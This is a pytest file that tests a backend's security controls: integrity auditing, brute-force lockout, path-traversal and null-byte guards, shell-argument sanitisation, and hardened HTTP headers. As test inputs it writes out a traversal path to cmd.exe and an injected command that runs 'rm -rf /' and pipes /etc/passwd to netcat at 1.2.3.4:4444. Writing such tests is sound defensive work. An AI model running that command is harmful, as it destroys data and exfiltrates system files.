import pytest
from httpx import AsyncClient, ASGITransport
from pathlib import Path

from backend.app.main import app
from backend.app.core.rate_limiter import BruteForceProtector
from backend.app.core.security import validate_safe_path, sanitize_shell_argument
from backend.app.services.integrity_service import platform_integrity_sentinel


@pytest.mark.asyncio
async def test_platform_self_integrity_audit():
    """Verify platform can compute and verify its own SHA-256 cryptographic module baseline."""
    # Rebuild baseline to encompass current code state
    platform_integrity_sentinel.rebuild_baseline()
    audit_res = platform_integrity_sentinel.audit_integrity()

    assert audit_res["is_intact"] is True
    assert audit_res["verdict"] == "VERIFIED_CLEAN"
    assert audit_res["modules_monitored"] >= 10
    assert audit_res["tampered_count"] == 0
    assert audit_res["missing_count"] == 0


@pytest.mark.asyncio
async def test_brute_force_protector_lockout_and_recovery():
    """Verify adaptive brute-force defense enforces lockout after threshold."""
    protector = BruteForceProtector(max_failures=3, window_seconds=60, lockout_seconds=120)
    test_ip = "192.168.1.100"

    # Initially not locked
    locked, _ = protector.is_locked_out(test_ip)
    assert not locked

    # Attempt 1: failure
    is_locked, left, _ = protector.record_failure(test_ip)
    assert not is_locked
    assert left == 2

    # Attempt 2: failure
    is_locked, left, _ = protector.record_failure(test_ip)
    assert not is_locked
    assert left == 1

    # Attempt 3: threshold breached -> locked out
    is_locked, left, duration = protector.record_failure(test_ip)
    assert is_locked
    assert left == 0
    assert duration == 120

    # Query lockout status
    locked, remaining = protector.is_locked_out(test_ip)
    assert locked
    assert remaining > 0

    # Successful login resets lockout
    protector.record_success(test_ip)
    locked, _ = protector.is_locked_out(test_ip)
    assert not locked


def test_safe_path_traversal_guard():
    """Verify directory traversal and LFI attacks are strictly rejected."""
    base = Path("c:/Users/kakan/Desktop/cyber_security/data").resolve()

    # Valid subpath
    safe = validate_safe_path(base, "uploads/sample.bin")
    assert safe.is_relative_to(base)

    # Attempt directory traversal out of data/
    with pytest.raises(ValueError, match="Path traversal"):
        validate_safe_path(base, "../../../Windows/System32/cmd.exe")

    # Attempt null byte injection
    with pytest.raises(ValueError, match="Null byte"):
        validate_safe_path(base, "uploads/test.txt\x00.exe")


def test_sanitize_shell_arguments():
    """Verify shell metacharacters are purged from subprocess arguments."""
    dirty_cmd = "file.txt; rm -rf / ; cat /etc/passwd | nc 1.2.3.4 4444"
    cleaned = sanitize_shell_argument(dirty_cmd)
    assert ";" not in cleaned
    assert "|" not in cleaned
    assert "$" not in cleaned


@pytest.mark.asyncio
async def test_military_grade_security_headers_and_armor_api():
    """Verify HTTP responses contain military-grade security headers and posture endpoint works."""
    transport = ASGITransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://test") as client:
        res = await client.get("/api/v1/health")
        assert res.status_code == 200

        # Verify hardened security headers
        headers = res.headers
        assert headers.get("x-frame-options") == "DENY"
        assert headers.get("x-content-type-options") == "nosniff"
        assert "max-age=63072000" in headers.get("strict-transport-security", "")
        assert "default-src 'self'" in headers.get("content-security-policy", "")
        assert "no-store" in headers.get("cache-control", "")
        assert headers.get("server") == "SENTINEL-X-Hardened-Shield"

        # Verify security posture endpoint
        posture_res = await client.get("/api/v1/health/security-posture")
        assert posture_res.status_code == 200
        posture_data = posture_res.json()
        assert "GRADE A+" in posture_data["security_grade"]
        assert posture_data["self_integrity"]["is_intact"] is True
        assert posture_data["access_control"]["anti_brute_force_active"] is True
